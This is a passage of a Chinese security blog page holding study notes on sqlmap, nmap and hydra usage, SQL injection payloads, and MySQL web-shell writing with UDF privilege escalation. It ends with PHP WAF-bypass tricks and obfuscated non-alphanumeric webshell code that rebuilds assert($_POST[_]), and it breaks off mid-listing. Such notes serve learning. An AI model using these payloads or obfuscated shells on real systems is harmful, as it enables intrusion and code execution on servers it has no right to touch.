@@ -1,0 +1,1923 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>柠檬茶的博客</title>
+  <meta name="author" content="John Doe">
+
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="柠檬茶的博客">
+
+  
+  
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="柠檬茶的博客" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">柠檬茶的博客</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper">
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-02-04T08:56:12.000Z"><a href="/2020/02/04/20200204/">2020-02-04</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/02/04/20200204/">2020年2月04日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><p>常用参数</p>
+<pre><code>-u 单个URL -m xx.txt 多个URL
+-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库
+--data post/get都适用
+-p 指定扫描的参数
+-r 读取文件
+-f 指纹信息
+--tamper 混淆脚本，用于应用层过滤
+--cookie --user-agent --host等等http头的修改
+--threads 并发线程 默认为1
+--dbms MySQL&lt;5.0&gt; 指定数据库或版本
+
+–level=LEVEL 执行测试的等级（1-5，默认为 1）
+–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险
+–current-db / 获取当前数据库名称
+–dbs 枚举数据库管理系统数据库
+–tables 枚举 DBMS 数据库中的表
+–columns 枚举 DBMS 数据库表列
+-D DB 要进行枚举的数据库名
+-T TBL 要进行枚举的数据库表
+-C COL 要进行枚举的数据库列
+-U USER 用来进行枚举的数据库用户
+</code></pre><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*
+-iL ip.txt 扫描ip.txt的所有ip
+-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描
+-O 探测操作系统信息
+-sV 查找主机服务版本号
+-sA 探测该主机是否使用了包过滤器或防火墙
+-sS 半开扫描，一般不会记入日志，不过需要root权限。
+-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。
+-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。
+-sN TCP空扫描
+-F 快速扫描
+-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。
+-p 指定端口/端口范围
+-oN 将报告写入文件
+-v 详细信息
+-T&lt;0-5&gt; 设定速度
+</code></pre><p>Nmap还可以用到爆破等一些脚本</p>
+<pre><code>--script all 使用所有脚本
+--script=sql.injection.nse sql注入
+--script=&quot;smb*&quot;  扫smb系列
+</code></pre><p>#### </p>
+<h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p>
+<pre><code>hydra IP -l loginname -P pass.txt PROTROCL
+hydra 127.0.0.1 -l root -P pass.txt ssh
+</code></pre><h2 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h2><ul>
+<li><p>@为用户变量，使用<code>SET @var1=1</code>赋值</p>
+</li>
+<li><p>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></p>
+</li>
+</ul>
+<h2 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入/绕过常用的函数"></a>注入/绕过常用的函数</h2><ol>
+<li>基于布尔SQL盲注<ul>
+<li><code>left(database(),1)&gt;&#39;s&#39;</code></li>
+<li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li>
+<li><code>ascii(substr((select database()),1,1))=98</code></li>
+<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li>
+<li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li>
+<li><code>select user() like &#39;ro%&#39;</code></li>
+</ul>
+</li>
+<li>基于报错的SQL盲注<ul>
+<li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code></li>
+</ul>
+</li>
+</ol>
+<p>#### </p>
+<h2 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h2><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4><ol>
+<li>写shell用什么函数？<ul>
+<li><code>select &#39; into outfile &#39;D:/shelltest.php&#39;</code></li>
+<li><code>dumpfile</code></li>
+<li><code>file_put_contents</code></li>
+</ul>
+</li>
+<li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 </li>
+<li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li>
+<li>sleep()能不能写shell？</li>
+<li>写shell的条件？<ul>
+<li>用户权限</li>
+<li>目录读写权限</li>
+<li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 </li>
+<li>open_basedir: 将用户可操作的文件限制在某目录下</li>
+</ul>
+</li>
+</ol>
+<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><h3 id="spring加入配置"><a href="#spring加入配置" class="headerlink" title="spring加入配置"></a>spring加入配置</h3><!-- controller注解扫描 -->
+<p>&lt;context:component-scan base-package=<em>“cn.cnn.springboot.controller”</em> /&gt;</p>
+<!-- 注解驱动 -->
+<p>&lt;mvc:annotation-driven /&gt;</p>
+<hr>
+<p><strong>site:域名 inurl:admin</strong>  查找后台</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/安全/">安全</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-02-01T08:56:12.000Z"><a href="/2020/02/01/20200201/">2020-02-01</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/02/01/20200201/">2020年2月01日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="php中-代替-来取数组的元素"><a href="#php中-代替-来取数组的元素" class="headerlink" title="php中{}代替[]来取数组的元素"></a>php中{}代替[]来取数组的元素</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'asdf'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="waf处理的是-REQUEST数组，然而数据处理的却是GET"><a href="#waf处理的是-REQUEST数组，然而数据处理的却是GET" class="headerlink" title="waf处理的是_REQUEST数组，然而数据处理的却是GET"></a>waf处理的是<strong>_REQUEST</strong>数组，然而数据处理的却是GET</h3><p>同一个变量名字，如果<code>variables_order</code>的顺序P在G后面，那么<code>$_POST[&#39;x&#39;]</code>会覆盖<code>$_GET[&#39;x&#39;]</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
+\<span class="token package"><span class="token punctuation">\</span></span>
+<span class="token constant">POST</span> <span class="token operator">/</span><span class="token operator">?</span>a<span class="token operator">=</span>get <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">6</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span>charset<span class="token operator">=</span>utf<span class="token number">-8</span>
+
+a<span class="token operator">=</span>post
+
+<span class="token comment" spellcheck="true">//</span>
+<span class="token keyword">Array</span>
+<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> post
+<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="GET数组键值特殊字符替换"><a href="#GET数组键值特殊字符替换" class="headerlink" title="GET数组键值特殊字符替换"></a>GET数组键值特殊字符替换</h3><p><a href="http://127.0.0.1?.*=abc" target="_blank" rel="noopener">http://127.0.0.1?.*=abc</a></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_*'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'.*'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//发现.*被替换成了_*</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>PHP对于传入的非法的<code>$_GET</code>数组参数名，会将其转换成下划线</p>
+<p>非法字符开头或者只有一个非法字符的情况，会被转换成<code>_</code>的有：<code>.</code>。 非法字符在中间，或者非法字符结尾的情况，会被转换成<code>_</code>的有：<code>.</code>、<code>空格</code>、<code>+</code>、<code>[</code>。</p>
+<h3 id="利用运算符"><a href="#利用运算符" class="headerlink" title="利用运算符"></a>利用运算符</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%12'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%14'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='assert';</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0D'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%2F'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0E'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $__='_POST';</span>
+<span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// assert($_POST[_]);</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>利用UTF-8编码的某个汉字，并将其中某个字符取出来</p>
+<p><img src="/2020/02/01/20200201/19-9-28_PHP_运算符_2.jpg" alt="img"></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+
+<span class="token variable">$____</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"的"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"半"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"始"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"俯"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"次"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"站"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$_____</span><span class="token punctuation">;</span>
+<span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="递增／递减运算符"><a href="#递增／递减运算符" class="headerlink" title="递增／递减运算符"></a>递增／递减运算符</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='Array';</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_=$_[0];</span>
+<span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span>
+<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
+<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// E </span>
+<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// R</span>
+<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span>
+<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+
+<span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// P</span>
+<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span>
